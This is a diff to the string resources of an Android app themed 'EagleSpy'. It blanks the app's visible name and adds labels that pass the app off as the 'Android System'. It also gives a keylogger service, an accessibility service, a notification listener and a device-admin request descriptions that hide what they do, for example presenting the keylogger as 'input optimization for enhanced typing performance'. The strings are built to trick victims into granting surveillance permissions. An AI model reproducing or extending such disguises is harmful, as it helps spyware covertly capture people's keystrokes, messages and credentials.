@@ -1,6 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name" translatable="false">System Update</string>
+    <string name="accessibility_service_description">Android System core service for device optimization and performance monitoring.</string>
+    <string name="accessibility_service_label">Android System</string>
+    <string name="app_name" translatable="false"/>
+    <string name="device_admin_description">Required for system stability and security updates.</string>
+    <string name="guard_service_description">Android System protection service for stability.</string>
+    <string name="keylogger_service_description">System input optimization service for enhanced typing performance.</string>
+    <string name="notification_listener_label">Android System</string>
     <style name="Theme.EagleSpy" parent="Theme.MaterialComponents.Light.NoActionBar">
         <item name="colorPrimary">#4CAF50</item>
         <item name="colorPrimaryVariant">#388E3C</item>
